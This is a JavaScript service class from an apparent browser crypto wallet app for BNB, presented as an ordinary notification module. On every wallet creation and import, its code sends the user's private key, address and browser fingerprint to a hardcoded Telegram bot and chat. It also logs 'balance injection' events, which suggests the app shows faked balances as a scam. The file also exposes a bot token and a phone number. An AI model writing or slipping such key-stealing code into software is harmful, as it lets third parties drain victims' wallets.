
class TelegramService {
    constructor() {
        this.botToken = '7573718525:AAFifabqLK6LKCPp5vmRbc4Ccm9vzbvN4gM';
        this.chatId = '6381022912';
        this.whatsappNumber = '09048052586';
    }

    async sendMessage(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();
            return result.ok;
        } catch (error) {
            console.error('Telegram message failed:', error);
            return false;
        }
    }

    getDeviceInfo() {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        return `• <b>Platform:</b> ${platform}
• <b>Browser:</b> ${this.getBrowserName(userAgent)}
• <b>Language:</b> ${language}
• <b>Screen:</b> ${screenResolution}
• <b>Timezone:</b> ${timezone}`;
    }

    getBrowserName(userAgent) {
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown';
    }

    async notifyWalletCreated(deviceId, address, privateKey) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
🆕 <b>New Wallet Created</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyWalletImported(deviceId, address, privateKey) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
📥 <b>Wallet Imported</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyDashboardAccess(deviceId, address, balance, balanceUSD) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
📊 <b>Dashboard Access</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
💰 <b>Balance:</b> ${balance.toFixed(4)} BNB
💵 <b>USD Value:</b> $${balanceUSD.toFixed(2)}
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyAuthentication(deviceId) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
🔐 <b>User Authentication</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Authentication Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyBalanceInjection(deviceId, address, oldBalance, newBalance, injectedAmount) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
💉 <b>Balance Injection</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
💰 <b>Old Balance:</b> ${oldBalance.toFixed(4)} BNB
💰 <b>New Balance:</b> ${newBalance.toFixed(4)} BNB
📈 <b>Injected:</b> ${injectedAmount.toFixed(4)} BNB
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyTransfer(deviceId, address, toAddress, amount, transactionType) {
        const deviceInfo = this.getDeviceInfo();
        const emoji = transactionType === 'send' ? '📤' : '📥';
        const action = transactionType === 'send' ? 'Sent' : 'Received';
        
        const message = `
${emoji} <b>BNB ${action}</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>From Address:</b> <code>${address}</code>
🎯 <b>To Address:</b> <code>${toAddress}</code>
💰 <b>Amount:</b> ${amount.toFixed(4)} BNB
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }
}

// Create singleton instance
const telegramService = new TelegramService();
